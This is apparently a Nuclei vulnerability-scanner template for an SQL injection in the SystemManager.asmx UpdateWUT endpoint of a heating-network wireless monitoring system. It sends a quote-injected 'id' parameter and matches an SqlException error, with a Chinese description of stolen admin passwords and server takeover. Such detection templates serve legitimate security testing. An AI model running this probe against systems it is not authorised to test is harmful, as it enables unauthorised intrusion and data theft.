id: rewang-SystemManager-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 热网无线监测系统 SystemManager.asmx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%83%AD%E7%BD%91%E6%97%A0%E7%BA%BF%E7%9B%91%E6%B5%8B%E7%B3%BB%E7%BB%9FSystemManager.asmx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Content-Length: 19

        id=1'&name=1&desc=1
    matchers:
      - type: word
        part: body
        words:
          - System.Data.SqlClient.SqlException
